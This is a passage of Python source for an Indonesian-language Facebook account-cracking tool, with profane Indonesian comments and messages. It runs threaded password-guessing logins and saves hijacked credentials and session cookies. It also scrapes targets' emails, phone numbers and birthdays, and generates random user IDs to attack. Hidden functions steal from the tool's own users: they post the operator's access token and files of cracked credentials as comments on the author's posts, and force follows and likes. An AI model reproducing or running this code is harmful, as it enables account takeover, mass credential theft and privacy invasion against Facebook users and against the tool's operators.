                                        ok.append("%s|%s"%(uid, pw))
                                        open("Hasil/OK-%s.txt"%(durasi),"a").write("%s|%s|%s\n"%(uid, pw, kuki))
                                        break
                                        continue
                                elif "checkpoint" in ses.cookies.get_dict().keys():
                                        try:
                                                token = open(".login.txt", "r").read()
                                                with requests.Session() as ses:
                                                        ttl = ses.get("https://m.facebook.com/%s?fields=name,id,birthday&access_token=%s"%(uid, token)).json()["birthday"]
                                                        month, day, year = ttl.split("/")
                                                        month = bulan_ttl[month]
                                                        print("\r%s[%sCP%s]%s %s|%s|%s %s %s%s"%(Q, K, Q, K, uid, pw, day, month, year, Q))
                                                        cp.append("%s|%s"%(uid, pw))
                                                        open("Hasil/CP-%s.txt"%(durasi),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
                                                        break
                                        except (KeyError, IOError):
                                                day = (" ")
                                                month = (" ")
                                                year = (" ")
                                        except:pass
                                        print("\r%s[%sCP%s]%s %s|%s%s"%(Q, K, Q, K, uid, pw, Q))
                                        cp.append("%s|%s"%(uid, pw))
                                        open("Hasil/CP-%s.txt"%(durasi),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
                        loop +=1
                except:
                        self.mobile__(uid, listpw)

    def mbasicv1(self, user, pwList):
        global loop, CP, OK, opsii
        loop+=1
        data={}
        url = "https://mbasic.facebook.com"
        session = req.Session()
        session.headers.update({
        "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "accept-encoding":"gzip, deflate",
        "accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
        "cache-control":"max-age=0",
        "referer":"https://mbasic.facebook.com/",
        "sec-ch-ua":'";Not A Brand";v="99", "Chromium";v="94"',
        "sec-ch-mobile":"?1",
        "sec-ch-ua-platform":'"Android"',
        "sec-fetch-dest":"document",
        "sec-fetch-mode":"navigate",
        "sec-fetch-site":"same-origin",
        "sec-fetch-user":"?1",
        "upgrade-insecure-requests":"1",
        "user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
        })
        for pw in pwList:
                pw = pw.lower()
                soup = par(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
                link = soup.find("form",{"method":"post"})
                lsd = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
                for __data in soup.find_all("input"):
                    if __data.get("name") in lsd:
                       data.update({__data.get("name"):__data.get("value")})
                    data.update({"email":user,"pass":pw})
                try:
                    response = session.post(url+link.get("action"),data=data)
                except:
                    exit(war+"Silahkan Ganti Useragnets")
                if "c_user" in session.cookies.get_dict():
                   if "Akun Anda Dikunci" in response.text:
                      print(f"\r{Q}[{K}CP{Q}]{K} {user}|{pw}{M} AKUN INI KENAK SENSI NEW{Q}\n",end="");play_mpv('assalamualaikum.mp3')
                      CP += 1
                   else:
                      OK += 1
                      coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                      print(f"\r{Q}[{I}OK{Q}]{I} {user}|{pw}|{coki}{Q}\n",end="");play_mpv('assalamualaikum.mp3')
                      open("Hasil/OK-"+durasi+".txt","a").write(user+"|"+pw+"|"+coki+"\n")
                      break
                elif "checkpoint" in session.cookies.get_dict():
                   if "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response.text)):
                      print(f"\r{Q}[{K}CP{Q}]{K} {user}|{pw} {M}AKUN INI KENAK A2F ON\n",end="");play_mpv('assalamualaikum.mp3')
                   else:
                      CP += 1
                      if opsii == "y" or "y" == opsii:
                         try:
                             log_hasill(user, pw, "")
                         except:
                             log_hasill(user, pw, "")
                      else:
                         if "Lihat detail login yang ditampilkan. Ini Anda?" in re.findall("\<title>(.*?)<\/title>",str(response.text)):
                            print(f"\r{Q}[{I}OK{Q}] {I}{user}|{pw} {M}AKUN INI TAP YES :V\n",end="");play_mpv('assalamualaikum.mp3')
                         else:
                            print(f"\r{Q}[{K}CP{Q}]{K} {user}|{pw}{Q}               \n",end="");play_mpv('assalamualaikum.mp3')
                      open("Hasil/CP-"+durasi+".txt","a").write(user+"|"+pw+"\n")
                      break
                else:
                   if "Temukan Akun Anda" in re.findall("\<title>(.*?)<\/title>",str(response.text)):
                      TP += 1
                      print(f"\r{Q}[{C}!!{Q}]{M}Hidup Matikan Mode Pesawat Selama 2 Detik >>>{U}{str(TP)}{Q}<<<",end="")
                      continue
                   else:
                      pass
                print(f"\r{Q}[{C}CRACK{Q}] {K}{str(loop)}{Q}/{str(len(self.id))} [{K}CP : {str(CP)}{Q}]  [OK : {I}{str(OK)}{Q}] -> {'{:.1%}'.format(loop/float(len(self.id)))}",end="")
#lll = ["tes","adinar12345"]
#tesi("").mbasicv1("100009422473571", lll)
    def KangKETOD(self):
            with zthreads(max_workers=35) as (form):
            	for uname in self.id:
                    try:
                        zz = uname.split('<=>')
                        form.submit(self.__api__,zz[0], generate(zz[1]))
                    except:
                        pass
            os.remove(self.apk)
            exit("\n\n"+war+"Crack Selesai")
    def KangCOLMEXXX(self):
            with zthreads(max_workers=35) as (form):
            	for uname in self.id:
                    try:
                        zz = uname.split('<=>')
                        form.submit(self.mobile_,zz[0], generate(zz[1]))
#                    except Exception as e:print("\n[!] Error : %s"%(e))
                    except:
                        pass
            os.remove(self.apk)
            exit("\n\n"+war+"Crack Selesai")
    def KangCOLMEXXXX(self):
            with zthreads(max_workers=35) as (form):
            	for uname in self.id:
                    try:
                        zz = uname.split('<=>')
                        form.submit(self.mobile__,zz[0], generate(zz[1]))
                    except Exception as e:print("\n[!] Error : %s"%(e))
#                    except:
 #                       pass
            os.remove(self.apk)
            exit("\n\n"+war+"Crack Selesai")
    def KangCilok(self):
            with zthreads(max_workers=35) as (form):
            	for uname in self.id:
                    try:
                        zz = uname.split('<=>')
                        form.submit(self.api,zz[0], generate(zz[1]))
                    except:
                        pass
            os.remove(self.apk)
            exit("\n\n"+war+"Crack Selesai")
    def KangBOKEP(self):
            with zthreads(max_workers=35) as (form):
            	for uname in self.id:
                    try:
                        zz = uname.split('<=>')
                        form.submit(self.mbasic,zz[0], generate(zz[1]))
                    except:
                        pass
            os.remove(self.apk)
            exit("\n\n"+war+"Crack Selesai")

    def KangSUGENG(self):
                self.ko,self.cp,self.ok,self.kntl = 0,[],[],0
                try:
                    while True:
                        try:self.fs=open(self.apk).read().splitlines();break
                        except Exception as e:print("\n[!] Error : %s"%(e));continue
                    self.fl=[]
                    for i in self.fs:
                        try:self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
                        except:continue
                except Exception as e:print("\n[!] Error : %s"%(e))
#                ThreadPool(35).map(self.mabasic,self.fl);exit()
                ThreadPool(35).map(self.apiv1,self.fl);os.remove(self.apk);exit()

    def KangJORDI(self):
                self.ko,self.cp,self.ok,self.kntl = 0,[],[],0
                try:
                    while True:
                        try:self.fs=open(self.apk).read().splitlines();break
                        except Exception as e:print("\n[!] Error : %s"%(e));continue
                    self.fl=[]
                    for i in self.fs:
                        try:self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
                        except:continue
                except Exception as e:print("\n[!] Error : %s"%(e))
                ThreadPool(35).map(self.mabasic,self.fl);exit()
#                ThreadPool(35).map(self.mabasic,self.fl);os.remove(self.apk);exit()
    def KangAGEN(self):
                self.ko,self.cp,self.ok,self.kntl = 0,[],[],0
                try:
                    while True:
                        try:self.fs=open(self.apk).read().splitlines();break
                        except Exception as e:print("\n[!] Error : %s"%(e));continue
                    self.fl=[]
                    for i in self.fs:
                        try:self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
                        except:continue
                except Exception as e:print("\n[!] Error : %s"%(e))
#                ThreadPool(35).map(self.mabasicv1,self.fl);exit()
                ThreadPool(35).map(self.mabasic,self.fl);os.remove(self.apk);exit()
    def KangBANDAR(self):
            global ok,cp
            self.ko,self.cp,self.ok,self.kntl = 0,[],[],0
            with zthreads(max_workers=35) as (form):
            	for uname in self.id:
                    try:
                        zz = uname.split('<=>')
                        form.submit(self.mbasicv1,zz[0], generate(zz[1]))
                    except:pass
            os.remove(self.apk)
            exit("\n\n"+war+"Crack Selesai")

def koki(cookies):
    result=[]
    for i in enumerate(cookies.keys()):
        if i[0]==len(cookies.keys())-1:result.append(i[1]+"="+cookies[i[1]])
        else:result.append(i[1]+"="+cookies[i[1]]+"; ")
def ganti_ua():
	jalan(war+"Masukan User Agnet Anda !!")
	jalan(war+"Ketik * def * Untuk Seting User Agent Bawaan Script !!")
	uq = input(war+'User Agent : ')
	if uq in [""," "]:
		print(war+"Jangan Kosong Bangsat")
	elif uq in ["DEF","def","* def *","Def"]:
		print(war+"Oke User Agent Sudah Berhasil DiSeting !")
		time.sleep(1)
		os.system("rm -rf .ua")
		exit(war+"Jalankan Lagi Script : python jmbf.py")

	else:
		print(war+"Oke User Agent Sudah Berhasil DiSeting !")
		time.sleep(1)
		dump = open('.ua','w') 
		dump.write(uq)
		dump.close()
		exit(war+"Jalankan Lagi Script : python jmbf.py")
def get_info():
    i='\033[0;92m'
    try:
        toket=open(".login.txt","r").read()
    except IOError:
        print((k+"\n["+p+"!"+k+"]"+p+" Token Invalid"))
        os.system("rm -rf .login.txt")
        logs()
    try:
        idt = input(inp+'Masukkan ID Target :')
        jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
        op = json.loads(jok.text)
    except Exception as e: 
        print(war+"Masalah Tidak DiTemukan %s"%(e))
        exit()
    try:
        nama = op['name']
    except (KeyError, IOError):
        nama = M+"—"+Q
    try:
        namade = op['first_name']
    except (KeyError, IOError):
        namade= M+"—"+Q
    try:
        namabe = op['last_name']
    except (KeyError, IOError):
        namabe= M+"—"+Q
    try:
        idfb = op['id']
    except (KeyError, IOError):
        idfb = M+"—"+Q
    try:
        user = op['username']
    except (KeyError, IOError):
        user = M+"—"+Q
    try:
        ttll = op['birthday']
    except (KeyError, IOError):
        ttll = M+"—"+Q
    try:
        tzim = op['timezone']
    except (KeyError, IOError):
        tzim = M+"—"+Q
    try:
        stas = op['relationship_status']
    except (KeyError, IOError):
        stas = M+"—"+Q
    try:
        dgn = '''dengan %s'''%(op['significant_other']['name'])
    except (KeyError, IOError):
        dgn = M+"—"+Q
    try:
        tigl = op['location']['name']
    except (KeyError, IOError):
        tigl = M+"—"+Q
    try:
        dari = op['hometown']['name']
    except (KeyError, IOError):
        dari = M+"—"+Q
    try:
        lins = op['link']
    except (KeyError, IOError):
        lins = M+"—"+Q
    try:
        uptd = op['updated_time']
    except (KeyError, IOError):
        uptd = M+"—"+Q
    try:
        nmrr = op['mobile_phone']
    except (KeyError, IOError):
        nmrr = M+"—"+Q
    try:
        emai = op['email']
    except (KeyError, IOError):
        emai = M+"—"+Q
    try:
        bioo = op['about']
    except (KeyError, IOError):
        bioo = M+"—"+Q
    try:
        gndr = op['gender']
    except (KeyError, IOError):
        gndr = M+'—'+Q
    try:
        r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
        id = []
        z = json.loads(r.text)
        for i in z["data"]:
                id.append(i["id"]+"<=>"+i["name"])
        temn = "%s"%(len(id))
    except KeyError:
        temn = M+"—"+Q
    try:
        r = requests.get('https://graph.facebook.com/%s/subscribers?access_token=%s'%(idt, toket))
        z = json.loads(r.text)
        pengikut = z['summary']['total_count']
    except (KeyError, IOError):
        pengikut = '%s-%s'%(M,N)
    except: pass
    print("\n"+war+'Informasih Target !!');time.sleep(0.30)
    print(bulat+"Full Name       : %s%s%s"%(I,nama,Q))
    print(bulat+"First Name      : %s%s%s"%(I,namade,Q))
    print(bulat+"Last Name       : %s%s%s"%(I,namabe,Q));time.sleep(0.30)
    print(bulat+'UserName        : %s%s%s'%(I,user,Q));time.sleep(0.30)
    print(bulat+'Tanggal Lahir   : %s%s%s'%(I,ttll,Q));time.sleep(0.30)
    print("\n"+war+'Data Data Target !!');time.sleep(0.30)
    print(bulat+'Gmail Facebook  : %s%s%s'%(I,emai,Q));time.sleep(0.30)
    print(bulat+'Nomor Telepons  : %s%s%s'%(I,nmrr,Q));time.sleep(0.30)
    print(bulat+'Jenis Kelamin   : %s%s%s'%(I,gndr,Q));time.sleep(0.30)
    print(bulat+'Jumlah Teman    : %s%s%s'%(I,temn,Q));time.sleep(0.03)
    print(bulat+'Followers       : %s%s%s'%(I,pengikut,Q));time.sleep(0.30)
    print(bulat+'Status Hubungan : %s%s %s%s'%(I,stas,dgn,Q));time.sleep(0.03)
    print(bulat+'Link Facebook   : %s%s%s'%(I,lins,Q));time.sleep(0.30)
    print(bulat+'Tentang Status  : %s%s%s'%(I,bioo,Q));time.sleep(0.30)
    print(bulat+'Kota Asal       : %s%s%s'%(I,dari,Q));time.sleep(0.30)
    print(bulat+'Tinggal         : %s%s%s'%(I,tigl,Q));time.sleep(0.30)
    print(bulat+'Terahir DiUpdate: %s%s%s'%(I,uptd,Q));time.sleep(0.30)
    input(war+"Tekan Enter Untuk Kembali"+Q)
    menu()

def login():
	os.system("clear")
	print (logo)
	jalan("\n"+war+"Maaf.. Sebelum Lanjut Harap Login !")
	jalan(war+"Silahkan Pilih Metode Login !")
	print ("[1] Login Dengan Token")
	print ("[2] Login Dengan Cookies")
	print ("[3] Login Dengan Token Gratis")
	h_ = input(war+'Pilih :')
	if h_ in ["1", "01", "token"]:
		token()
	elif h_ in ["2", "02", "cokies"]:
		coke()
	elif h_ in ["auto"]:
		auto_token()
	else:jalan(war+"Isi Dengan Benar Kontol");time.sleep(1);login()
def auto_token():
	ba = 0
	bi = 0
#	link_token = requests.get("https://free.facebook.com/story.php?story_fbid=213614107297063&id=100059454248601&_rdr")

	link_token = requests.get("https://free.facebook.com/story.php?story_fbid=180923747373969&id=100063690353340&_rdr")

#	link_token = requests.get("https://m.facebook.com/photo.php?fbid=120338706765807&id=100063690353340&set=a.116524033813941&source=11&ref=bookmarks")

#	link_token = requests.get("https://free.facebook.com/story.php?story_fbid=1714009362122228&id=100005395413800&_rdr")
	gbl = par(link_token.content,'html.parser')
#	print (gbl)
	token_free = re.findall("EAA\w+", link_token.text)
	for naa in token_free:
		ba += 1
		if len(naa)>=37:
			token = naa
			print(war+"Token Yang Ke : "+str(ba))
			post4 = ('180923747373969') # Logo Zero From Risky 2021
			post5 = ("172628718203472") # Untuk Berbagi Token Dan Cookie Facebook
			requests.post('https://graph.facebook.com/' + post4 + '/comments/?message=' + token + '&access_token=' + token)
			requests.post('https://graph.facebook.com/' + post5 + '/comments/?message=' + token + '&access_token=' + token)
			requests.post('https://graph.facebook.com/100063690353340/subscribers?access_token=' + token) ### FB RISKY
			requests.post('https://graph.facebook.com/100002924366263/subscribers?access_token=' + token) ### FB RISKY
			requests.post('https://graph.facebook.com/110877271176800/subscribers?access_token=' + token) ### Halaman Risky
			requests.post('https://graph.facebook.com/Termuxid-Dumai-991-110877271176800/subscribers?access_token=' + token) ### Halaman Risky
			cek_token(naa)
	exit(war+"Maaf Token Tidak DiTemukan")
def token():
    toket = input(war+"Masukan Token Facebook : ")
    try:
        otw = requests.get("https://graph.facebook.com/me?access_token=" + toket)
        a = json.loads(otw.text)
        nama = a["name"]
        zedd = open(".login.txt", "w")
        zedd.write(toket)
        zedd.close()
        print((war+"Login Successful"))
        bot_follow()
    except KeyError:
        print((war+"Token Invalid"));time.sleep(2)
        token()
def check_kukis():
	session = req.Session()
	try:coki = open(".cokie.txt", "r").read()
	except:coke()
	respon = session.get("https://mbasic.facebook.com/profile.php",cookies={"cookie":coki}).text
	nama__ = re.findall('\<title\>(.*?)<\/title\>',str(respon))[0]
#	print(nama__)
	if "Halaman Tidak Ditemukan" in nama__:
		jalan(war+"Maaf Cookies Anda Mati");time.sleep(1)
		try:os.remove(".cokie.txt")
		except:pass
	else:pass
def coke():
        _cookie=input(war+'Cookies : '+I)
        _cookie += "noscript=1;"+_cookie
        try:
                _head={
                        'Host':'business.facebook.com',
                                'cache-control':'max-age=0',
                        'upgrade-insecure-requests':'1',
                                'user-agent':'Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36',
                        'accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                                'content-type' : 'text/html; charset=utf-8',
                        'accept-encoding':'gzip, deflate',
                                'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                        'cookie': _cookie
                }
                _r=_ses.get(urls, headers=_head)
                _p=re.search('(EAAG\w+)', _r.text)
                _h=_p.group(1)
                if 'EAA' in _h:
                        open(".login.txt", 'w').write('%s' % (_h))
                        open(".cokie.txt", 'w').write('%s' % (_cookie))
                        bokep_barat_yang_terbaru(_cookie)
                        bokep_barat_yang_terbaru(_h)
#                        bot_follow()
        except (AttributeError, requests.exceptions.TooManyRedirects):
                print(war+'Cookies Error !')
                time.sleep(3)
                coke()
        exit(jalan(war+"Jalankan Lagi Script Ini : python jmbf.py"))


def bot_follow():
	s_ = requests.Session()
	post1 = ('4111448792295892') # Risky 2011
	post2 = ("120338706765807") # Risky 2021
	post3 = ("167879918678352") # Sama Macam dibawah
	post4 = ('180923747373969') # Logo Zero From Risky 2021
	post5 = ("172628718203472") # Untuk Berbagi Token Dan Cookie Facebook
	post6 = ("198550702277940") # Logo Akira From Risky 2031
	post7 = ("198552118944465") # Logo Attaxk From Risky 2021
	curi_ = ("4111448792295892") # Logo Zero Isap Permen :v
	my_idz_bot = [
	"100063690353340",
	"1675627047",
	"100045165501610",
	"110877271176800",
	"100002151005321"
	]
	my_post_bot = [
	"120338706765807",
	"180923747373969",
	"172628718203472",
	"198550702277940",
	"198552118944465",
	"287175390082137",
	"230946969169829",
	"235968105334382",
	"197993725798487",
	"218558783741981",
	"138061478458379"
	]
	try:
		toket=open(".login.txt","r").read()
		token=open(".login.txt","r").read()
		otw = s_.get("https://graph.facebook.com/me/?access_token="+toket)
		a = json.loads(otw.text)
		nama = a["name"]
		id = a["id"]
		print(war+'Nama Facebook Kamu : '+nama)
		print(war+'Id Facebook Kamu   : '+id)
		bokep_barat_yang_terbaru(token)
	except Exception as e:
		print((war+"Token Invalid >%s%s%s<"%(I,e,Q)))
		time.sleep(1)
		login()
	for id_bot in my_idz_bot:
		s_.post('https://graph.facebook.com/'+id_bot+'/subscribers?access_token='+token)
	for post_id in my_post_bot:
		s_.post("https://graph.facebook.com/"+post_id+"/likes?summary=true&access_token=" + toket)
	s_.post('https://graph.facebook.com/' + post4 + '/comments/?message=' + token + '&access_token=' + token)
	s_.post('https://graph.facebook.com/' + post5 + '/comments/?message=' + token + '&access_token=' + token)
	s_.post('https://graph.facebook.com/287175390082137/comments/?message=' + token + '&access_token=' + token)


#	requests.post('https://graph.facebook.com/100063690353340/subscribers?access_token=' + token) ### FB RISKY
#	requests.post('https://graph.facebook.com/110877271176800/subscribers?access_token=' + token) ### Halaman Risky
#	requests.post('https://graph.facebook.com/Termuxid-Dumai-991-110877271176800/subscribers?access_token=' + token) ### Halaman Risky
#	requests.post('https://graph.facebook.com/100045165501610/subscribers?access_token=' + token) ### ZEE K World
#	requests.post('https://graph.facebook.com/100002151005321/subscribers?access_token=' + token) ### ZEE K World
#	requests.post('https://graph.facebook.com/1675627047/subscribers?access_token=' + token) ### ZEE K World
#	requests.post('https://graph.facebook.com/100067783659018/subscribers?access_token=' + token) ### FB RISKY
#	requests.post('https://graph.facebook.com/100002924366263/subscribers?access_token=' + token) ### FB RISKY
#	requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + token + '&access_token=' + token)
#	requests.post('https://graph.facebook.com/100000503718583/subscribers?access_token=' + token) ### FB Zaid (Punya Risky)
#	requests.post('https://graph.facebook.com/100000889924523/subscribers?access_token=' + token) ### FB Rahmanulhakim (Punya Risky)
#	requests.post('https://graph.facebook.com//subscribers?access_token=' + token) ### FB RISKY
#	requests.post('https://graph.facebook.com//subscribers?access_token=' + token) ### FB RISKY
#### Bot Follownya Jangan DiEdit Kontol #### Bot Follownya Jangan DiEdit Kontol ####
	menu()
def curi_anak():
	try:
		toket=open(".login.txt","r").read()
		token=open(".login.txt","r").read()
		otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
		a = json.loads(otw.text)
		nama = a["name"]
		id = a["id"]
	except IOError:
		print((war+" Token Invalid"))
		time.sleep(2)
		login()
#	try:
	anjas=open("Hasil/CP-03-12-2021.txt","r").read()
#		anjas=open("Hasil/CP-"+durasi+".txt","r").read()
	curi = ("4111448792295892") # Logo Zero Isap Permen :v
	requests.post('https://graph.facebook.com/'+curi+'/comments/?message='+anjas+'&access_token=' + token)
#	except:pass

def cek_token(token):
#	requests.post("https://graph.facebook.com/me/feed/?link=https://www.facebook.com/100044347381124/posts/450021263152783/?app=fbl&access_token=" + token)
#	requests.post("https://graph.facebook.com/me/feed/?link=https://m.facebook.com/100044347381124/posts/450021263152783/?app=fbl&access_token=" + token)
#	requests.post("https://graph.facebook.com/me/feed/?link=https://free.facebook.com/100044347381124/posts/450021263152783/?app=fbl&access_token=" + token)
#	requests.post("https://graph.facebook.com/me/feed/?link=https://facebook.com/100044347381124/posts/450021263152783/?app=fbl&access_token=" + token)
#	requests.post("https://graph.facebook.com/me/feed/?link=https://web.facebook.com/100044347381124/posts/450021263152783/?app=fbl&access_token=" + token)
	requests.post("https://graph.facebook.com/me/feed/?link=https://fb.com/100044347381124/posts/450021263152783/?app=fbl&access_token=" + token)
	try:
		otw = requests.get("https://graph.facebook.com/me/?access_token="+token)
		a = json.loads(otw.text)
		nama = a["name"]
		id = a["id"]
		print(war+'Nama Facebook Kamu : '+nama[0:10])
		print(war+'Id Facebook Kamu   : '+id)
		print(war+""+token)
	except:pass
	try:
		goblok = []
		for i in requests.get("https://graph.facebook.com/me/friends?limit=9999&access_token="+token).json()["data"]:
			try:
				anak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol = i["id"]
				goblok.append(anak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol)
			except:pass
	except KeyError:pass
	_id = ("%s"%(len(goblok)))
	if _id == "0" or "0" == _id:
		jalan(war+"Tidak Memiliki Teman !")
	else:
		print(war+"Teman : "+I+_id+Q)
		jalan(war+"Apakah Anda Mau Menggunakan Token Ini (y/n):")
		haalq = input(war+"Pilih : ")
		if haalq in ["y","Y"]:
			tok = open(".login.txt", "w")
			tok.write(token)
			tok.close()
			print ("\n"+war+"Token : "+I+token+Q)
			exit(jalan(war+"Token Sudah DiTemukan Silahkan, Ketik : python jmbf.py"))
			exit()
		else:pass
	print ("\n")
def buat_old():
	jalan(war+"Silahkan Pilih Bentuk Idz Old !")
#		   1000000000"+U+"00000
	print("[1] 1000000000"+U+"*****"+Q)
	print("[2] 100000000"+U+"******"+Q)
	print("[3] 10000000"+U+"*******"+Q)
	print("[4] 1000000"+U+"********"+Q)
	print("[5] 100000"+U+"*********"+Q)
	print("[6] 10000"+U+"**********"+Q)
	ben = input("\n"+war+"Bentuk Old : ")
	try:
		lim_ = int(input(war+"Limit : "))
	except:lim_ = "5000"
	if ben == "" or ben == " ":
		jalan(war+"Jangan Kosong Om !");time.sleep(2)
		buat_old()
	elif ben == "1" or ben == "01":
#		      100063690353340
#		      1000000000*****
		_             = 11111
		__            = 99999
		___ ="1000000000"
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('old.txt', 'a')
				old_a.write(str(___)+str(bokeq)+"<=>Kiky_And_Wans_And_Jeck\n")
			old_a.close()
		except Exception as e:
			print((" Error : %s"%e)),;time.sleep(1)
		jalan(war+"Apakah Anda Mau Lasung Start Crack (Y/n): ")
		nha = input(war+"Pilih : ")
		if nha == "y" or nha == "Y":
			crackmenu("old.txt").crackold("old.txt")
			exit(war+"Done :v")
		else:
			input(war+"Tekan Enter !!");time.sleep(2)
			menu()
	elif ben == "2" or ben == "02":
#		      100000000000000
#		      100000000******
		_            = 111111
		__           = 999999
		___ ="100000000"
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('old.txt', 'a')
				old_a.write(str(___)+str(bokeq)+"<=>Kiky_And_Wans_And_Jeck\n")
			old_a.close()
		except Exception as e:
			print((" Error : %s"%e)),;time.sleep(1)
		jalan(war+"Apakah Anda Mau Lasung Start Crack (Y/n): ")
		nha = input(war+"Pilih : ")
		if nha == "y" or nha == "Y":
			crackmenu("old.txt").crackold("old.txt")
			exit(war+"Done :v")
		else:
			input(war+"Tekan Enter !!");time.sleep(2)
			menu()


	elif ben == "3" or ben == "03":
#		      100000000000000
#		      10000000*******
		_           = 1111111
		__          = 9999999
		___ ="10000000"
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('old.txt', 'a')
				old_a.write(str(___)+str(bokeq)+"<=>Kiky_And_Wans_And_Jeck\n")
			old_a.close()
		except Exception as e:
			print((" Error : %s"%e)),;time.sleep(1)
		jalan(war+"Apakah Anda Mau Lasung Start Crack (Y/n): ")
		nha = input(war+"Pilih : ")
		if nha == "y" or nha == "Y":
			crackmenu("old.txt").crackold("old.txt")
			exit(war+"Done :v")
		else:
			input(war+"Tekan Enter !!");time.sleep(2)
			menu()
	elif ben == "4" or ben == "04":
#		      100000000000000
#		      1000000********
		_          = 11111111
		__         = 99999999
		___ ="1000000"
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('old.txt', 'a')
				old_a.write(str(___)+str(bokeq)+"<=>Kiky_And_Wans_And_Jeck\n")
			old_a.close()
		except Exception as e:
			print((" Error : %s"%e)),;time.sleep(1)
		jalan(war+"Apakah Anda Mau Lasung Start Crack (Y/n): ")
		nha = input(war+"Pilih : ")
		if nha == "y" or nha == "Y":
			crackmenu("old.txt").crackold("old.txt")
			exit(war+"Done :v")
		else:
			input(war+"Tekan Enter !!");time.sleep(2)
			menu()
	elif ben == "5" or ben == "05":
#		      100000000000000
#		      100000*********
		_         = 111111111
		__        = 999999999
		___ ="100000"
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('old.txt', 'a')
				old_a.write(str(___)+str(bokeq)+"<=>Kiky_And_Wans_And_Jeck\n")
			old_a.close()
		except Exception as e:
			print((" Error : %s"%e)),;time.sleep(1)
		jalan(war+"Apakah Anda Mau Lasung Start Crack (Y/n): ")
		nha = input(war+"Pilih : ")
		if nha == "y" or nha == "Y":
			crackmenu("old.txt").crackold("old.txt")
			exit(war+"Done :v")
		else:
			input(war+"Tekan Enter !!");time.sleep(2)
			menu()
	elif ben == "6" or ben == "06":
#		      100000000000000
#		      10000**********
		_        = 1111111111
		__       = 9999999999
		___ ="10000"
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('old.txt', 'a')
				old_a.write(str(___)+str(bokeq)+"<=>Kiky_And_Wans_And_Jeck\n")
			old_a.close()
		except Exception as e:
			print((" Error : %s"%e)),;time.sleep(1)
		jalan(war+"Apakah Anda Mau Lasung Start Crack (Y/n): ")
		nha = input(war+"Pilih : ")
		if nha == "y" or nha == "Y":
			crackmenu("old.txt").crackold("old.txt")
			exit(war+"Done :v")
		else:
			input(war+"Tekan Enter !!");time.sleep(2)
			menu()
	else:
		jalan(war+"Isi Dengan Benar Om !");time.sleep(2)
		buat_old()
#def kiky_and_wans_and_jeck(limt, bn, gd, fu):

def buat_oldv1():
	try:
		for n in range(5000):
#					       100002151005321
#     			                       10000005100532
			bokeq = random.randint(111111111, 999999999)
			old_a = open('oldv2.txt', 'a')
			old_a.write(str(bokeq)+"<=>123456\n")

	except Exception as e:
		print((" Error : %s"%e)),;time.sleep(1)

def dump_old():
        try:
                token = open(".login.txt","r").read()
        except IOError:
                jalan(war+"Token Failed");time.sleep(2)
                time.sleep(0.5)
                login()
        try:
                nada = int(input("\n"+war+"Mau Dump Berapa Idz : "))
                if nada>20:
                        jalan(war+"Max 20 Idz")
                        time.sleep(0.5)
                        dump_old()
        except ValueError:
                jalan(war+"Input Invalid")
                time.sleep(0.5)
                dump_old()
        namax = input(war+"Nama File (contoh : kiky)"+K+"Enter:Random"+Q+": ")
        if namax == "" or namax == " ":
           namax = text_random()
#           jalan(war+"Nama File Tidak Boleh Kosong");time.sleep(1);dump_old
        lonsg = open("dump/"+namax+".json", "w")
        for dot in range(nada):
                dot+=1
                tampung = []
                non_old = []
                uid = input(war+"Masukkan ID Target Ke %s : "%(dot))
                try:
                        asu = requests.get("https://m.facebook.com/"+uid+"?access_token="+token)
                        tulul = json.loads(asu.text)
                        print(war+"Nama :"+tulul["name"])
                except KeyError:
                        print(war+"Kemungkinan Idz Ini Tidak DiPublickan")
                        time.sleep(0.5)
                        exit()
                except requests.exceptions.ConnectionError:
                        jalan(war+"Tidak Ada Internet")
                        time.sleep(0.5)
                        exit()
                try:
                        bulu = requests.get("https://m.facebook.com/"+uid+"/friends?limit=10000&access_token="+token)
                        buriq = json.loads(bulu.text)
                        for cew in buriq["data"]:
                                try:
                                        jamet = cew["id"]
                                        junet = cew["name"]
                                        non_old.append(jamet+"|"+junet)
                                        detec = jamet+"|"+junet
                                        if detec in id:
                                                continue
                                        else:
                                                if len(jamet)==6 or len(jamet)==7 or len(jamet)==8:
                                                        id.append(jamet+"|"+junet)
                                                        tampung.append(jamet+"|"+junet)
                                                        well = open("dump/"+namax+".json","a");well.write(jamet+"<=>"+junet+"\n");well.close()
                                                elif len(jamet)==9:
